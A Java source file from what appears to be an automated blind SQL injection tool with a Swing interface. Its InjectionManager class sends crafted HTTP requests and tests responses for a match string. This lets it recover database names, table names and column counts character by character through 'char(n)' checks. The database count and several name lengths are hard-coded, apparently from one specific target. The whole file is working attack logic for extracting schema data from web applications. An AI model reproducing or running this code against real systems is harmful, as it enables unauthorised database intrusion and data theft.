package control;

import java.util.ArrayList;
import java.util.List;
import java.util.Vector;

import javax.swing.JTextArea;
import javax.swing.SwingWorker;
import javax.swing.table.DefaultTableModel;

import http.HttpHelper;
import http.HttpPayload;
import http.HttpPayloadFactory;
import input.InputPanel;
import input.TargetType;
import input.UserInput;
import query.QueryType;
import result.ResultPanel;
import status.StatusPanel;

/**
 *
 * @brief	: 
 * @author	: Jae-Woong Moon(mjw8585@gmail.com)
 * @Date	: 2017/09/05
 */
public class InjectionManager{

	/** http  **/
	private HttpHelper HttpHelper = null;
	private HttpPayloadFactory factory = null;
	
	/** ui references **/
	private ControlPanel controlPanel = null;
	private ResultPanel resultPanel = null;
	private StatusPanel statusPanel = null;
	
	/** print variables **/
	private int requestCount = 0;
	private UserInput input;
	private InjectionWorker worker = new InjectionWorker();
	
	/** control variables  **/
	private boolean canceled = false;
	private boolean paused = false;
	private boolean workDone = false;
	
	public InjectionManager() {
		HttpHelper = new HttpHelper();
		factory = new HttpPayloadFactory();
	}
	
	public void setResultPanel(ResultPanel resultPanel) {
		this.resultPanel = resultPanel;
	}
	
	public void setControlPanel(ControlPanel controlPanel){
		this.controlPanel = controlPanel;
	}
	
	public void setStatusPanel(StatusPanel statusPanel) {
		this.statusPanel = statusPanel;
	}
	

	public void start(UserInput input){
		this.input = input;
		
		System.out.println("[STATUS] canceled : " + canceled +", paused : " + paused + ", workDone : " + workDone);
		
		// case 1. after worker canceled
		if (canceled && !paused) {
			worker = new InjectionWorker();
			//resultPanel.clearResults(); 
		}
		// case 2. after worker job has done (new start) 
		if(workDone){
			System.out.println("start new injection worker. ");
			worker = new InjectionWorker();
		}
		
		// start worker
		worker.execute();
		
		// case 3. after paused 
		if (paused){
			resume();
		}
		
	}
	
	public void pause(){
		System.out.println("===== PAUSE");
		paused = true;
	}
	
	public void stop(){
		worker.cancel(true);
		requestCount = 0;
		canceled = true;
		paused = false;
	}
	
	private synchronized void resume(){
		System.out.println("==== RESUME");
		paused = false;
		this.notify();
	}
	

	class InjectionWorker extends SwingWorker<Boolean, Void> {
		
		@Override
		protected Boolean doInBackground(){
			
			try{
				if(input.getTargetType() == TargetType.DB_SCHEMA){
					printLog("DB Search Start...");
					resultPanel.selectTab(0);
					dbSearch(input);
				}else if(input.getTargetType() == TargetType.TABLE){
					printLog("Table Search Start...");
					resultPanel.selectTab(1);
					tableSearch(input);
				}
				System.out.println("==== Worker job has done.");
				printLog("Worker job has done.");
				workDone = true;
				controlPanel.initButtons();
				return true;
				
			}catch(Exception e){
				printLog("Work Excepiton : " + e.getMessage());
				e.printStackTrace();
			}
			return true;
		}
		
		private void printLog(String msg){
			statusPanel.printLog(msg);
		}
		
		private void printRequestCount(int cnt) {
			statusPanel.printRequestCount(cnt + "");
		}
		
		/** Table Tab **/
		private void tableSearch(UserInput input){
			input.setTargetType(TargetType.TABLE);
			DefaultTableModel updateTo =  resultPanel.getTableResultUI().getTableModel();
			
			/* STEP 1. DB 결과 테이블에 존재하는 DB명인가? */
			Vector<Vector<String>> dbData = resultPanel.getDBResultUI().getTableModel().getDataVector();
			int tableRowNum = 0;
			for (int i= 0; i < dbData.size(); i++ ){
				Vector<String> dbRow =  dbData.get(i);
				int tableCount =0;
				tableCount = Integer.parseInt(dbRow.get(3));
				for (int j=0; j < tableCount; j++){
					
					/* STEP 2. insert tableRowNum and db name */
					final String dbName =  dbRow.get(2);
					String[] tableRow = {(tableRowNum +1) +"", dbName};
					updateTo.addRow(tableRow);

					/* STEP 3. Search and update table name length */
					int tableNameLength = searchTableNamesLength(input, dbName, j);
					updateTo.setValueAt(tableNameLength+"", tableRowNum, 2);
					
					/* STEP 4. Search and update table names */
					String tableName = searchTableName(input, dbName, tableNameLength);
					updateTo.setValueAt(tableName, tableRowNum, 3);
					
					/* STEP 5. Search and update the number of Columns per each table*/
					int columnCnt = searchColumnCount(input, dbName, tableName);
					updateTo.setValueAt(columnCnt+"", tableRowNum, 4);
					
					tableRowNum ++;
				}
				
				
			}
		}
		
		// deprecated
		private void allTableSearch(UserInput input){
			input.setTargetType(TargetType.TABLE);
			DefaultTableModel updateTo =  resultPanel.getTableResultUI().getTableModel();
			
			/* STEP 1. Get target db schema's info from the result UI */
			Vector<Vector<String>> dbData = resultPanel.getDBResultUI().getTableModel().getDataVector();
			int tableRowNum = 0;
			for (int i= 0; i < dbData.size(); i++ ){
				Vector<String> dbRow =  dbData.get(i);
				int tableCount =0;
				tableCount = Integer.parseInt(dbRow.get(3));
				for (int j=0; j < tableCount; j++){
					
					/* STEP 2. insert tableRowNum and db name */
					final String dbName =  dbRow.get(2);
					String[] tableRow = {(tableRowNum +1) +"", dbName};
					updateTo.addRow(tableRow);

					/* STEP 3. Search and update table name length */
					int tableNameLength = searchTableNamesLength(input, dbName, j);
					updateTo.setValueAt(tableNameLength+"", tableRowNum, 2);
					
					/* STEP 4. Search and update table names */
					String tableName = searchTableName(input, dbName, tableNameLength);
					updateTo.setValueAt(tableName, tableRowNum, 3);
					
					/* STEP 5. Search and update the number of Columns per each table*/
					int columnCnt = searchColumnCount(input, dbName, tableName);
					updateTo.setValueAt(columnCnt+"", tableRowNum, 4);
					
					tableRowNum ++;
				}
				
				
			}
		}
		
		private int searchTableNamesLength(UserInput input, String dbName, int tableIndex){
			int length = 0;
			input.setTargetType(TargetType.TABLE);
			input.setQueryType(QueryType.LENGTH);
			input.setDbName(dbName);
			input.setTableIndex(tableIndex);
			length =  cntWork(input, input.getCountUntil());
			return length;
		}
		
		private String searchTableName(UserInput input, String dbName, int tableNameLength){
			String content = "";
			input.setTargetType(TargetType.TABLE);
			input.setQueryType(QueryType.CONTENT);
			for(int i=0; i < tableNameLength ; i++){
				input.setTableNameIndex(i+1); 
				String chr = contentWork(input); 
				//System.out.println("chr : "  + chr);
				content += chr; 
			}
			return content;
		}
		
		private int searchColumnCount(UserInput input, String dbName, String tableName){
			input.setTargetType(TargetType.COLUMN);
			input.setQueryType(QueryType.COUNT);
			input.setDbName(dbName);
			input.setTableName(tableName);
			return cntWork(input, input.getCountUntil());
		}

		/** DB Tab **/
		private void dbSearch(UserInput input){

			input.setTargetType(TargetType.DB_SCHEMA);
			/* STEP 1. search db count */
			//int dbCount = searchDBCount(input);  // <-- 61로 하드코딩
			int dbCount = 61;
			if(dbCount == 0){
				return ;
			}

			// setting result table
			DefaultTableModel dbTableModel =  resultPanel.getDBResultUI().getTableModel();
			for (int i=0; i < dbCount; i++){
				Integer[] row = {i+1};
				dbTableModel.addRow(row);
			}
			
			// STEP 2. search db name lengths
			//List<Integer> dbNameLengths = searchDBNameLength(input, dbCount, dbTableModel); // <-- 하드코딩
			List<Integer> dbNameLengths = new ArrayList<Integer>();
			/*
			dbNameLengths.add(18); //1
			dbNameLengths.add(14); //2
			dbNameLengths.add(14); //3
			dbNameLengths.add(14); //4
			dbNameLengths.add(14); //5
			dbNameLengths.add(14); //6
			dbNameLengths.add(14); //7
			dbNameLengths.add(14); //8
			dbNameLengths.add(14); //9
			dbNameLengths.add(14); //10
			dbNameLengths.add(14); //11
			dbNameLengths.add(14); //12
			dbNameLengths.add(14); //13
			dbNameLengths.add(14); //14
			dbNameLengths.add(14); //15
			dbNameLengths.add(14); //16
			dbNameLengths.add(14); //17
			dbNameLengths.add(6); //18
			dbNameLengths.add(14); //19
			dbNameLengths.add(14); //20
			dbNameLengths.add(14); //21
			dbNameLengths.add(14); //22
			dbNameLengths.add(14); //23
			dbNameLengths.add(14); //24
			dbNameLengths.add(14); //25
			dbNameLengths.add(14); //26
			dbNameLengths.add(14); //27
			dbNameLengths.add(14); //28
			dbNameLengths.add(5); //29
			dbNameLengths.add(14); //30
			*/
			//dbNameLengths.add(14); //31~61 모두 14,  47번만 3
			
			
			// STEP 3. search db names
			List<String> dbNames = searchDBNames(input, dbCount, dbNameLengths, dbTableModel);
			
			// STEP 4. search table counts
			input.setTargetType(TargetType.TABLE);
			List<Integer> tableCounts = searchTableCounts(input, dbNames, dbTableModel);
				
		}
	
		private int searchDBCount(UserInput input){
			input.setQueryType(QueryType.COUNT);
			return cntWork(input, input.getCountUntil());
		}
		
		private List<Integer> searchDBNameLength(UserInput input, int dbCount, DefaultTableModel updateTo){
			List<Integer> result = new ArrayList<Integer>();
			input.setQueryType(QueryType.LENGTH);
			
			for (int i=0; i < dbCount; i++){
				input.setDbIndex(i);
				int length = cntWork(input,input.getLengthUntil());
				result.add(length);
				updateTo.setValueAt(length+"", i, 1); // update GUI
				updateTo.fireTableDataChanged();
			}
			return result;
		}
		
		public List<String> searchDBNames(UserInput input, int dbCount, List<Integer> dbNameLengths, DefaultTableModel updateTo){
			List<String> dbNames = new ArrayList<String>();
			input.setQueryType(QueryType.CONTENT);
			
			for (int i=0; i < dbCount; i++){
				input.setDbIndex(i); 
				String dbName = searchDBName(input, dbNameLengths.get(i));
				dbNames.add(dbName);
				updateTo.setValueAt(dbName, i, 2);
				updateTo.fireTableDataChanged();
			}
			return dbNames;
		}
		
		private String searchDBName(UserInput input, int dbNameLength){
			String content = "";
			for(int i=0; i < dbNameLength ; i++){
				input.setDbNameIndex(i+1); 
				content += contentWork(input);
			}
			return content;
		}
		
		private List<Integer> searchTableCounts(UserInput input, List<String> dbNames, DefaultTableModel updateTo){
			List<Integer> tableCounts = new ArrayList<Integer>();
			input.setQueryType(QueryType.COUNT);
			for(int i=0; i < dbNames.size(); i++){
				int tableCount = searchTableCount(input, dbNames.get(i));
				updateTo.setValueAt(tableCount+"", i, 3);
				updateTo.fireTableDataChanged();
			}
			return tableCounts;
		}
		
		private int searchTableCount(UserInput input, String dbName){
			int tableCount = 0;
			input.setDbName(dbName);
			tableCount = cntWork(input, input.getCountUntil());
			return tableCount;
		}
		
		/** common **/
		private int cntWork(UserInput input, int until){
			
			int cnt = 0;
			for(int i=0; i < until; i++){
				if(!isCancelled()){
					//System.out.println("Cnt work : " + i);
					if(paused){
						//System.out.println("BackGround paused, waiting for resume");
						try{
							synchronized(this){
								wait(1000);
								i--;
							}
						} catch(InterruptedException ex){
							System.out.println("Background interrupted");
						}
					}else{
						requestCount++;
						printRequestCount(requestCount);
						input.setCheckVal(i+"");
						HttpPayload payload = factory.getHttpPayload(input);
						String res = HttpHelper.send(payload);
						if(res.contains(input.getMatch())){
							cnt = i;
							break;
						}
					}
				}
			}
			return cnt;
		}
		
		private String contentWork(UserInput input){
			String ascii = "";
			
			for(int j=33; j < 127; j++){ //(search ascii 33~126)
				if(!isCancelled()){
					if(paused){
						//System.out.println("BackGround paused, waiting for resume");
						try{
							synchronized(this){
								wait(1000);
								j--;
							}
						} catch(InterruptedException ex){
							System.out.println("Background interrupted");
						}
					}else{
						requestCount++;
						printRequestCount(requestCount);
						input.setCheckVal("char("+j+")");
						HttpPayload payload = factory.getHttpPayload(input);
						String res = HttpHelper.send(payload);
						if(res.contains(input.getMatch())){
							ascii = Character.toString((char)j);
							break;
						}
					}
				}
			}
			return ascii;
		}
	}
	
}
